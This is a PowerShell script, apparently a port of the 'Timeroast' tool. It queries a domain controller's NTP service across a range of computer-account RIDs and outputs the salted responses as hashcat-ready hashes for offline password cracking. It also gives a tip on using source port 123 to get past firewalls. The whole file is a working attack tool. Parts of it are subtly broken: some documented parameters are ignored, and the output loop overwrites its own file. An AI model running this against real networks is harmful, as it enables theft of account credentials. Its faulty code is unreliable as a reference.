<#

.SYNOPSIS
    Performs an NTP 'Timeroast' attack against a domain controller.
    Outputs the resulting hashes in the hashcat format 31300 with the
    --username flag ("<RID>:$sntp-ms$<hash>$salt")

.DESCRIPTION
    Usernames within the hash file are user RIDs. In order to use a
    cracked password that does not contain the computer name, either
    look up the RID in AD (if you already have some account) or use
    a computer name list obtained via reverse DNS, service scanning,
    SMB NULL sessions, etc.

.PARAMETER domainController
    Hostname or IP address of a domain controller that acts as NTP
    server.

.PARAMETER outputFile
    Hash output file. Writes to stdout if omitted.

.PARAMETER relativeIds
    Comma-separated list of RIDs to try. Use hypens to specify
    (inclusive) ranges, e.g. "512-800,600-1400". By default, all
    possible RIDs will be tried until timeout.

.PARAMETER rate
    NP queries to execute second per second. Higher is faster, but
    with a greater risk of dropper datagrams, resulting in possibly
    incomplete results. Default: 180.

.PARAMETER timeout
    Quit after not receiving NTP responses for TIMEOUT seconds,
    possibly indicating that RID space has been exhausted.
    Default: 24.

.PARAMETER oldHashes
    Obtain hashes of the previous computer password instead of the
    current one.

.PARAMETER port
    NTP source port to use. A dynamic unprivileged port is chosen by default.
    Could be set to 123 to get around a strict firewall.

.NOTES
    Author of the powershell port: Jacopo (antipatico) Scannella

#>
param(
    [Parameter(Mandatory=$true, Position=0)]
    [string]$domainController,

    [string]$outputFile,
    [string]$relativeIDs,
    [Uint]$rate = 180,
    [Uint]$timeout = 24,
    [switch]$oldHashes,
    [Uint16]$port
)

$NTP_PREFIX = [byte[]]@(0xdb,0x00,0x11,0xe9,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xe1,0xb8,0x40,0x7d,0xeb,0xc7,0xe5,0x06,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xe1,0xb8,0x42,0x8b,0xff,0xbf,0xcd,0x0a)

$keyFlag = $oldHashes ? [Math]::Ceiling([Math]::Pow(2,31)) : 0
$results = @{} # Dictionary

for ($rid = 999; $rid -le 1500; $rid++) {
    if ($port -eq 0) {
        $client = New-Object System.Net.Sockets.UdpClient
    } else {
        $client = New-Object System.Net.Sockets.UdpClient($port)
    }
    $client.Client.ReceiveTimeout = 1000/$rate
    $client.Connect($domainController, 123)
    $query = $NTP_PREFIX + [BitConverter]::GetBytes(($rid -bxor $keyFlag)) + [byte[]]::new(16)
    [void] $client.Send($query, $query.Length)
    
    try {
        $reply = $client.Receive([ref]$null)
        
        if ($reply.Length -eq 68) {
            $salt = [byte[]]$reply[0..47]
            $md5Hash = [byte[]]$reply[-16..-1]
            $answerRid = ([BitConverter]::ToUInt32($reply[-20..-16], 0) -bxor $keyFlag)
            
            if($results.ContainsValue($answerRid)) {
                continue
            }
            $results[$answerRid] = [ValueTuple]::Create($salt, $md5Hash)
       }   
    }
    catch [System.Management.Automation.MethodInvocationException] {
        # No response, timed-out
    }
    finally {
        $client.Close()
    }
}

foreach($rid in $results.Keys) {
    $salt = $results[$rid][0]
    $md5Hash = $results[$rid][1]
    $hexSalt = [BitConverter]::ToString($salt).Replace("-", "").ToLower()
    $hexMd5Hash = [BitConverter]::ToString($md5Hash).Replace("-", "").ToLower()
    $hashcatHash = "{0}:`$sntp-ms`${1}`${2}" -f $rid, $hexSalt, $hexMd5Hash
    if ($outputFile) {
        Clear-Content $outputFile
        $hashcatHash | Out-File -Append -FilePath $outputFile
    } else {
        Write-Host $hashcatHash
    }
}
